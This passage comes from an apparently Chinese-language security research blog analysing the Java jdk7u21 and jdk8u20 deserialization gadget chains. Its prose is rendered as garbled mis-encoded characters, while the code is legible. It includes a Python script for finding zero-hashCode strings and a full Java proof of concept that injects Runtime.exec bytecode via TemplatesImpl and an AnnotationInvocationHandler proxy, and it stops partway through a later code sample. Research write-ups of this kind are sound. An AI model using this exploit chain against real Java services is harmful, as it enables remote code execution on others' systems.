<p>ç„¶åæ˜¯ä¿è¯ç¬¬äºŒä¸ªå†…å®¹èƒ½è¾¾æˆ <code>e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))</code> çš„è¯­å¥ï¼Œå…¶ä¸­å˜é‡ <code>e</code>  æ¥è‡ª <code>table</code> å±æ€§ä¸­ç´¢å¼•ä¸ºå˜é‡ <code>i</code> çš„å€¼ï¼Œè€Œå˜é‡ <code>i</code> çš„å€¼ç”±å˜é‡ <code>hash</code> çš„å€¼å†³å®šï¼Œå˜é‡ <code>hash</code> çš„å€¼åˆæ¥è‡ªé”®åçš„å€¼çš„ <code>hashCode</code> æ–¹æ³•çš„è¿”å›å€¼ï¼Œè¦æ»¡è¶³ä¸Šè¾¹çš„æ¡ä»¶ä¹Ÿå°±å¾—ä¿è¯ä¸¤ä¸ªå†…å®¹çš„é”®åçš„å€¼è°ƒç”¨ <code>hashCode</code> æ–¹æ³•çš„è¿”å›å€¼ä¸€è‡´ï¼Œä¹Ÿå°±æ˜¯ç­‰ä»·äºå¾—è®© <code>TemplatesImpl.hashCode() == AnnotationInvocationHand.hashCode()</code> æˆç«‹ã€‚</p>
<p>å…¶ä¸­ <code>TemplatesImpl.hashCode()</code> çš„å€¼æ— æ³•æ§åˆ¶ï¼Œè€Œ <code>AnnotationInvocationHand.hashCode()</code> åœ¨è°ƒç”¨æ—¶ç”±äº <code>AnnotationInvocationHand</code> è¢«ä½œä¸ºä»£ç†ä½¿ç”¨ï¼Œä¼šå…ˆæ¥åˆ°å…¶ <code>invoke</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171154094.png" alt="image-20220217115405948"></p>
<p>è¿›è€Œè°ƒç”¨å…¶ <code>hashCodeImpl</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171156771.png" alt="image-20220217115620665"></p>
<p>å¯è§åœ¨è°ƒç”¨ <code>hashCode</code> çš„æœ€ç»ˆè¿”å›å€¼ç”± <code>this.memberValues</code> å±æ€§çš„å…ƒç´ å†³å®šï¼Œè€Œ <code>this.memberValues</code> å±æ€§æ˜¯å¯æ§ä¸”å¯åºåˆ—åŒ–çš„ã€‚</p>
<p>ç»§ç»­çœ‹ä¸»è¦çš„éƒ¨åˆ† <code>var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code> ï¼Œå…¶ä¸­ <code>var3</code> å˜é‡ä¸º <code>this.memberValues</code> å±æ€§çš„å€¼ï¼Œè¿™é‡Œä¼šå°† <code>this.memberValues</code> å±æ€§å„ä¸ªå…ƒç´ ä¸­é”®åçš„å€¼å’Œå¯¹åº”çš„å€¼è°ƒç”¨ <code>hashCode</code> æ–¹æ³•å¾—åˆ°çš„è¿”å›å€¼è¿›è¡Œå¼‚æˆ–çš„ç»“æœä¾æ¬¡åŠ ä¸Šï¼Œæœ€åè¿”å›å¾—åˆ°çš„ç»“æœã€‚è€Œä¼—æ‰€å‘¨çŸ¥ä»»æ„å€¼å¯¹ <code>0</code> çš„å¼‚æˆ–éƒ½ä¸ºå…¶æœ¬èº«ï¼Œè‹¥è¿™ä¸ª <code>this.memberValues</code> å±æ€§çš„å…ƒç´ ä»…æœ‰ä¸€ä¸ªä¸”å”¯ä¸€ä¸€ä¸ªå…ƒç´ çš„é”®åçš„å€¼è°ƒç”¨ <code>hashCode</code> æ–¹æ³•å¾—åˆ°çš„ç»“æœä¸º <code>0</code> ï¼Œåªè¦å†è®©è¿™ä¸ªå”¯ä¸€ä¸€ä¸ªå…ƒç´ çš„å€¼çš„å†…å®¹ä¸º <code>TemplatesImpl</code> ç±»å°±å¯ä»¥è®© <code>TemplatesImpl.hashCode() == AnnotationInvocationHand.hashCode()</code> æˆç«‹äº†ã€‚</p>
<p>é‚£ä¹ˆå¦‚ä½•æ‰¾åˆ°ä¸€ä¸ª <code>hashCode</code> æ–¹æ³•ç»“æœä¸º <code>0</code> çš„å€¼å‘¢ï¼Œæœ€ç®€å•çš„å½“ç„¶æ˜¯ç”¨æ•°å€¼å‹ï¼Œä¸è¿‡ç”±äº <code>((String)var3.getKey()).hashCode()</code> è¿™ä¸€æ®µè®©è¿™ä¸ªé”®åçš„å€¼å¿…é¡»ä¸ºå­—ç¬¦ä¸²å‹ï¼Œå› æ­¤è·Ÿè¿› <code>String</code> ç±»çš„ <code>hashCode</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171207626.png" alt="image-20220217120738522"></p>
<p>å¯è§å…¶ <code>hashCode</code> æ–¹æ³•çš„æœ€ç»ˆè¿”å›å€¼æ˜¯éå†å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—ç¬¦ä¸å…¶ <code>hash</code> å±æ€§è®¡ç®—å åŠ çš„ç»“æœï¼Œè€Œ <code>hash</code> å±æ€§é»˜è®¤å€¼æ˜¯ä¸º <code>0</code> çš„ä¸”ä¸º <code>int</code> ç±»å‹ï¼Œæ­¤æ—¶å°±æœ‰ä¸¤ç§æ–¹å¼èƒ½è®©è¿”å›å€¼ä¸º <code>0</code> ğŸ‘‡</p>
<ul>
<li><code>int</code> ç±»å‹æº¢å‡º</li>
<li><code>0</code> å­—èŠ‚å­—ç¬¦</li>
</ul>
<p>å…¶ä¸­ <code>int</code> ç±»å‹æº¢å‡ºæ˜¯æµä¼ çš„æ¯”è¾ƒå¸¸ç”¨çš„æ–¹æ³•ï¼Œä¸»è¦åŸç†æ˜¯å› ä¸º <code>int</code> ç±»å‹ä¸º <code>8</code> ä¸ªå­—èŠ‚é•¿åº¦ï¼Œåªè¦ä½¿æœ€åè®¡ç®—çš„ <code>hash</code> å±æ€§å åŠ çš„ç»“æœåˆšå¥½ä¸º <code>0x100000000</code> å°±å¯ä»¥è¿”å› <code>0</code> äº†ï¼Œå› ä¸ºå½“ <code>hash</code> å±æ€§è®¡ç®—çš„å åŠ å€¼å¤§äº <code>0xffffffff</code> æ—¶å°±æœ‰å¯èƒ½å‡ºç°è´Ÿæ•°ã€‚</p>
<p>æ¯”å¦‚ç»å…¸å­—ç¬¦ä¸²<code>f5a5a608</code> å°±æ˜¯ç”¨çš„è¿™ä¸ªæ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171217447.png" alt="image-20220217121701326"></p>
<p>å¯è§æ˜¯å‡ºç°äº†è´Ÿæ•°ï¼Œå¦‚æœæ¥ç€è®¡ç®—åˆ™ç›¸å½“äº <code>(((((-1322903560 * 31) &amp; 0xffffffff + 48) &amp; 0xffffffff) * 31) &amp; 0xffffffff + 56) &amp; 0xffffffff</code> ï¼Œå…¶ä¸­ <code>((((-1322903560 * 31) &amp; 0xffffffff + 48) &amp; 0xffffffff) * 31) &amp; 0xffffffff</code> å€¼ä¸º <code>0xffffffC8</code> ï¼Œä¹Ÿå°±æ˜¯ <code>-56</code>ã€‚</p>
<p>è¿˜å¯ä»¥å†™ä¸€ä¸ªç®€å•çš„è„šæœ¬æ¥æ‰¾è¿™äº›å­—ç¬¦ğŸ‘‡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">s = [each <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"><span class="comment"># å­—ç¬¦ä¸²é•¿åº¦&gt;=5æ‰æœ‰å¯èƒ½æº¢å‡º</span></span><br><span class="line">p = product(s,repeat=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> p:</span><br><span class="line">        h = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> c:</span><br><span class="line">            h = (<span class="number">31</span> * h + t) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        h = (<span class="number">31</span> * h) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> h &gt; <span class="number">0xffffff00</span>:</span><br><span class="line">            <span class="built_in">print</span>(c)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="built_in">str</span>(c)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœ€åå†è®¡ç®—æº¢å‡ºå·®å€¼å³å¯ï¼Œæ¯”å¦‚ <code>(142, 242, 198, 241, 171)</code> å·®å€¼ä¸º <code>252</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171237107.png" alt="image-20220217123745040"></p>
<p>å¯è§è¿™ä¸ªå­—ç¬¦ä¸²çš„ <code>hashCode</code> å€¼æ˜¯ä¸º <code>0</code> äº†ã€‚</p>
<p>ç¬¬äºŒç§ <code>0</code> å­—èŠ‚å­—ç¬¦æ˜¯æœ€ç®€å•çš„äº†ï¼Œæ³¨æ„è§‚å¯Ÿ <code>h = 31*h + val[off++]</code> å¼å­ï¼Œå…¶ä¸­ <code>h</code> æ¥è‡ª <code>hash</code> å±æ€§çš„å€¼ï¼Œè€Œ <code>hash</code> å±æ€§çš„é»˜è®¤å€¼ä¸º <code>0</code> ï¼Œåªéœ€æ„é€ ä¸€ä¸ªä»»æ„é•¿åº¦çš„ <code>0</code> å­—èŠ‚å³å¯è®©æœ€åè¿”å›å€¼ä¸º <code>0</code> ï¼Œæ¯”å¦‚ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171242246.png" alt="image-20220217124235175"> </p>
<p>éå¸¸çš„ç®€å•ã€‚</p>
<p>ä¹‹åå°±æ˜¯å°† <code>TemplatesImpl</code> ç±»çš„ <code>payload</code> æ”¾åˆ°ä¸Šè¿°ä»»ä¸€ç»è¿‡ <code>hashCode</code> è¿”å›å€¼ä¸º <code>0</code> çš„å­—ç¬¦ä¸²é”®åå¯¹åº”çš„å€¼å°±å¥½äº†ã€‚å¦å¤–ï¼Œå¿…é¡»è®© <code>HashSet.put([TemplatesImplç±»()])</code> å…ˆè¢« <code>writeObject</code> ï¼Œè¿™æ ·æ‰èƒ½å¤Ÿç”¨ä½¿ <code>TemplatesImpl</code> çš„ <code>payload</code> ä½œä¸ºå‚æ•°å»è°ƒç”¨ <code>AnnotationInvocationHand</code> ä»£ç†çš„ <code>equals</code> æ–¹æ³•ã€‚</p>
<h3 id="payload-9"><a href="#payload-9" class="headerlink" title="- payload -"></a>- payload -</h3><p>å…³é”®ç‚¹åœ¨äºå¦‚ä½•è®© <code>HashSet.put([TemplatesImplç±»()])</code> å…ˆè¢« <code>writeObject</code> ï¼Œæ¯”å¦‚å¯ä»¥æ”¹ä¸€ä¸‹ <code>AnnotationInvocationHand</code> ä¸­ <code>memberValues</code> å±æ€§çš„å€¼ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk7u21</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–templateså¹¶é€šè¿‡åå°„èµ‹å€¼</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Class aih = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor aihC = aih.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ TemplatesImpl</span></span><br><span class="line">        TemplatesImpl ti = getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ key</span></span><br><span class="line">        String key = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="number">0</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ AnnotationInvocationHandlerä»£ç†</span></span><br><span class="line">        HashMap hm = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hm.put(key,ti.hashCode());</span><br><span class="line"></span><br><span class="line">        InvocationHandler aihC1 = (InvocationHandler) aihC.newInstance(Templates.class, hm);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(aih.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, aihC1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ HashSet</span></span><br><span class="line">        HashSet hs = <span class="keyword">new</span> HashSet();</span><br><span class="line">        hs.add(proxy);</span><br><span class="line">        hs.add(ti);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é¿å…æœ¬åœ°æ‰§è¡Œ</span></span><br><span class="line">        hm.put(key,ti);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(hs);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171313724.png" alt="image-20220217131300533"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h2 id="jdk8u20"><a href="#jdk8u20" class="headerlink" title="- jdk8u20 -"></a>- jdk8u20 -</h2><p>åœ¨åŸ <code>jdk8u20</code> é“¾çš„åŸºç¡€ä¸Šç¨ä½œäº†ä¸€äº›ä¿®æ”¹ï¼Œç ”ç©¶è¿™ä¸ª <code>jdk8u20</code> é“¾çš„å¸ˆå‚…ä»¬tqlã€‚</p>
<p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.8.0_20</code></li>
</ul>
<h3 id="è°ƒç”¨ç»“æ„-8"><a href="#è°ƒç”¨ç»“æ„-8" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BeanContextSupport.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	BeanContextSupport.readChildren()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	(Map)Proxy.readObject() &lt;=&gt; AnnotationInvocationHandler.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	HashSet.readObject()</span><br><span class="line">    	ğŸ‘‡</span><br><span class="line">		HashMap.put()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		(Map)Proxy.equals()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		(Map)Proxy.invoke() &lt;=&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">    	ğŸ‘‡</span><br><span class="line">    	AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">    		ğŸ‘‡</span><br><span class="line">			TemplatesImpl.newTransformer()</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">        	TemplatesImpl.getTransletInstance()</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">        	TemplatesImpl.defineTransletClasses()</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">        	newInstance()</span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h3><p>å…¶å® <code>jdk8u20</code> é“¾çš„ååŠæ®µå°±æ˜¯ <code>jdk7u21</code> é“¾äº†ï¼Œä¹‹æ‰€ä»¥å¤šå‡ºäº†åŠæ®µæ˜¯å› ä¸ºåœ¨ <code>AnnotationInvocationHandler</code> çš„ <code>readObject</code> æ–¹æ³•ä¸­å¤šäº†ä¸€ä¸ªå¯¹ <code>AnnotationInvocationHandler</code> çš„ <code>type</code> å±æ€§ç±»å‹çš„åˆ¤æ–­ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171329662.png" alt="image-20220217132952568"></p>
<p>æ˜¾ç„¶å¦‚æœä½¿ç”¨ <code>jdk7u21</code> çš„ <code>payload</code> åœ¨è¿™ä¸€æ®µä¼š <code>throw</code> å‡ºé”™è¯¯ï¼Œé‚£ä¹ˆå¦‚ä½•è§„é¿è¿™ä¸ªé”™è¯¯å‘¢ï¼Œæ¯”æ–¹è¯´å¯ä»¥ç”¨é•¶åµŒçš„ <code>try</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTry</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;START&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="number">1</span> / <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;THROW&quot;</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;throw&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;END&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œè¯¥ä»£ç å°†å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171334400.png" alt="image-20220217133426287"></p>
<p>å¯è§æœ€åæ˜¯èƒ½è¿‡åˆ°è¾¾ <code>END</code> è¾“å‡ºçš„ï¼Œè¿™æ˜¯å› ä¸ºç¬¬äºŒä¸ª <code>try</code> å°†ç¬¬ä¸€ä¸ª <code>try</code> ä¸­ <code>throw</code> å‡ºçš„é”™è¯¯ç»™ <code>catch</code> äº†ï¼ŒåŒæ—¶æ²¡æœ‰ä»»ä½•ä½œä¸ºï¼Œé‚£ä¹ˆåœ¨é€”ä¸­å°±ä¸ä¼šæŠ¥é”™äº†ã€‚</p>
<p>å¦‚æœè·Ÿè¿› <code>BeanContextSupport</code> ç±»çš„ <code>readChildren</code> æ–¹æ³•ï¼Œå°±å¯ä»¥çœ‹åˆ°ç±»ä¼¼é•¶åµŒ <code>try</code> çš„ç»“æ„ï¼Œå¹¶ä¸”åœ¨ç¬¬äºŒä¸ª <code>try</code> ä¸­æœ‰å…³äº <code>readObject</code> æ–¹æ³•çš„è°ƒç”¨ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171338996.png" alt="image-20220217133854893"></p>
<p>è€Œè¿™ä¸ª <code>readChildren</code> æ–¹æ³•å¯ä»¥ç”± <code>BeanContextSupport</code> ç±»çš„ <code>readObject</code> åˆ°è¾¾ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171338960.png" alt="image-20220217133818887"></p>
<p>é‚£ä¹ˆè¯¥å¦‚ä½•åˆ©ç”¨ <code>BeanContextSupport</code> ç±»çš„ <code>readChildren</code> æ–¹æ³•ä¸­ <code>try</code> é‡Œçš„å¾ªç¯ <code>readObject</code> å‘¢ï¼Œè¿™å°±æ¶‰åŠåˆ°äº†å…³äº <code>ååºåˆ—åŒ–</code> æ—¶çš„é—®é¢˜ã€‚</p>
<p>ç®€å•æ¥è¯´ä¸ºå½“ <code>A</code> ç±»è¿›è¡Œååºåˆ—åŒ–æ—¶å¦‚æœæœ‰ <code>readObject</code> å¤šä¸ª <code>B</code> ç±»çš„å†…å®¹ï¼Œåˆ™åªä¼šå¯¹ <code>B</code> ç±» <code>ååºåˆ—åŒ–</code> ä¸€æ¬¡(ä»…è°ƒç”¨ä¸€æ¬¡ <code>B</code> ç±»çš„ <code>readObject</code> æ–¹æ³•)ï¼Œæ­¤ååœ¨ <code>A</code> ç±»ä¸­å¦‚æœè¿›è¡Œæœ‰å…³ <code>B</code> ç±»çš„è°ƒç”¨å°±ä¼šä½¿ç”¨ç¬¬ä¸€æ¬¡  <code>B</code> ç±» <code>ååºåˆ—åŒ–</code> å¾—åˆ°çš„ <code>B</code> ç±»å®ä¾‹ã€‚</p>
<p>æ¯”æ–¹è¯´ä»¥ä¸‹ä»£ç ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span 